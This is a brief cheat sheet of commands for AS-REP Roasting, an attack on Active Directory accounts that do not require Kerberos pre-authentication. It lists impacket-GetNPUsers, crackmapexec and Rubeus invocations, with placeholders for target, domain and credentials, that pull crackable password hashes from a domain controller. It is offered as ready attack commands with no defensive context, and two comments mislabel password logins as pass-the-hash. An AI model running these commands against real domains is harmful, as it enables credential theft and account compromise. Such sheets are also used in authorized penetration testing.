# AS-REP Roasting
#### Remote
```bash
impacket-GetNPUsers -dc-ip <IP> '<DOMAIN>/' -usersfile <USERLIST>

impacket-GetNPUsers -dc-ip <IP> '<DOMAIN>/<USER>:<PASS>' -request # PTH

crackmapexec ldap <IP> --kdcHost <IP> -u '<USER>' -p '<PASS>' --asreproast <OUTPUT> # PTH
```

#### Local
```bash
Rubeus.exe asreproast /nowrap
```